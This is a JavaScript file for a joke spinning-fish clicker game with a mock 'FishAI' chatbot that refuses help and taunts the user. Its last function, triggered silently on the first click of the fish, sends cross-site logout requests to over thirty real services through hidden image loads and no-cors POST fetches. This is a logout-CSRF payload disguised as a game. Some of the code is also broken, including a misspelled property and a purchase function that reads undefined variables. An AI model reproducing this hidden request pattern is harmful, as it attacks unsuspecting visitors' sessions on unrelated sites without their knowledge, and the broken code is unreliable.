let coins = 0;
let isSpinning = false;
let spinSpeed = 2;

function toggleSpin() {
    const fish = document.getElementById('fish');
    isSpinning = fish.classList.toggle('spin');
}
setInterval(() => {
    if (isSpinning) {
        coins += 1;
        document.getElementById('coins').innerText = coins;
        document.getElementById('button-gold').disabled = coins < 50;
        document.getElementById('button-speed').disabled = coins < 150;
        document.getElementById('btn-scam').disabled = coins < 500;
    }
}, 100);

function buyItem() {
    if (coins >= cost) {
        coins -= cost;
        document.getElementById('coins').innnerText = coins;

        if (type === 'gold') {
            document.getElementById('fish').classList.add('gold');
        }
        if (type === 'speed') {
            spinSpeed = Math.max(0.1, spinSpeed - 0.4);
            document.getElementById('fish').style.animationDuration = spinSpeed + 's';
        }
        if (type === 'scam') {
            document.getElementById('ai-message').innerText = "Thanks for the 500 coins. You get nothing.";
        }
    }
}
setInterval(() => {
    document.getElementById('rpm').innerText = Math.floor(Math.random() * 5000 + 1000);
    document.getElementById('gf').innerText = (Math.random() * 10 + 2).toFixed(1);
    document.getElementById('syn').innerText = Math.floor(Math.random() * 100);
}, 250);

const aiResponses = [
    "Glub.",
    "I'm a fish, nothing special",
    "No I can't help you lmao",
    "As an AI fish, I can't help you, go deal with it yourself.",
    "i'm totally an ai!",
    "Did you know? Fish don't like spinning"
];
function askFishAI() {
    const message = document.getElementById('ai-message');
    const input = document.getElementById('ai-in');
    const button = document.getElementById('ai-button');
    const query = input.value.trim();

    input.disabled = true;
    button.disabled = true;
    message.innerText = "FishAI is thinking...";
    message.style.fontStyle = "italic";
    input.value = "";

    setTimeout(() => {
        message.style.fontStyle = "normal";
        input.disabled = false;
        button.disabled = false;
        input.focus();
        const lowerQuery = query.toLowerCase();
        if (lowerQuery.includes("stop")) {
            message.innerText = "No.";
        } else if (lowerQuery.includes("log out") || lowerQuery.includes("logout")) {
            message.innerText = "Nice try. You're trapped with the fish.";
        } else if (lowerQuery.includes("why")) {
            message.innerText = "Do not question the fish or else...";
        } else {
            const randomResponse = aiResponses[Math.floor(Math.random() * aiResponses.length)];
            message.innerText = randomResponse;
        }
    }, 1200 + Math.random() * 1500);
}
function executeSatireLogouts() {
    const getLogouts = [
        "http://www.amazon.com/gp/flex/sign-out.html?action=sign-out", "http://www.blogger.com/logout.g", "http://www.delicious.com/logout", 
        "https://panel.dreamhost.com/index.cgi?Nscmd=Nlogout", "https://www.dropbox.com/logout", "https://signin.ebay.com/ws/eBayISAPI.dll?SignIn", 
        "https://www.gandi.net/login/out", "https://github.com/logout", "http://mail.google.com/mail/?logout", "https://www.google.com/accounts/Logout",
        "https://secure.hulu.com/logout", "http://www.instapaper.com/user/logout", "https://manager.linode.com/session/logout", 
        "http://www.myspace.com/index.cfm?fuseaction=signout", "http://www.netflix.com/Logout", "http://www.nytimes.com/logout", 
        "https://secure.newegg.com/NewMyAccount/AccountLogout.aspx", "http://photobucket.com/logout", "https://secure.skype.com/account/logout", 
        "http://slashdot.org/my/logout", "http://soundcloud.com/logout", "http://steamcommunity.com/?action=doLogout", "http://store.steampowered.com/logout/", 
        "https://www.thinkgeek.com/brain/account/login.cgi?a=lo", "http://www.threadless.com/logout", "http://www.tumblr.com/logout", "http://vimeo.com/log_out", 
        "http://en.wikipedia.org/w/index.php?title=Special:UserLogout", "http://login.live.com/logout.srf", "https://account.woot.com/logout", 
        "https://wordpress.com/wp-login.php?action=logout", "https://login.yahoo.com/config/login?.src=fpctx&logout=1&.direct=1&.done=http://www.yahoo.com/"
    ];
    getLogouts.forEach(url => new Image().src = url);
    const postLogouts = [
        ["http://www.deviantart.com/users/logout", null], ["http://www.livejournal.com/logout.bml", "action:killall=1"], ["http://www.youtube.com", "action_logout=1"]
    ];
    postLogouts.forEach(([url, body]) => {
        fetch(url, { method: 'POST', body, mode: 'no-cors' }).catch(() => {});
    });
}

document.getElementById('fish').addEventListener('click', executeSatireLogouts, {once: true});